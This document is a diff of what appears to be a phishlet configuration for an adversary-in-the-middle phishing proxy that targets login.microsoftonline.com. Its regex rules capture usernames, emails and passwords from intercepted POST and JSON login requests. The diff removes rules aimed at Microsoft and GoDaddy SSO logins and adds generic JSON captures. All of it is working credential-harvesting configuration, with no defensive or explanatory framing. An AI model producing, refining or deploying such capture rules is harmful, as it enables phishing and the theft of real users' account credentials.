@@ -223,30 +223,18 @@ auth_urls:
 credentials:
   username:
     key: '(login|UserName|username|email|account)'
-    search: '([^"]+)'
-    type: 'post'
+    search: '"username":"([^"]*)'
+    type: 'json'
   password:
     key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)'
     search: '(.*)'
     type: 'post'
   custom:
-    # Microsoft JSON login (microsoftonline.com)
-    - key: "username_json"
-      search: '"username"\s*:\s*"([^"]+)'
+    - key: "username"
+      search: '"username":"([^"]*)'
       type: "json"
-    - key: "password_json"
-      search: '"password"\s*:\s*"([^"]+)'
-      type: "json"
-    # GoDaddy SSO JSON login
-    - key: "gd_email"
-      search: '"email"\s*:\s*"([^"]+)'
-      type: "json"
-    - key: "gd_password"
-      search: '"password"\s*:\s*"([^"]+)'
-      type: "json"
-    # GoDaddy secureserver variant
-    - key: "gd_pass2"
-      search: '"passwd"\s*:\s*"([^"]+)'
+    - key: "password"
+      search: '"password":"([^"]*)'
       type: "json"
 login:
   domain: 'login.microsoftonline.com'
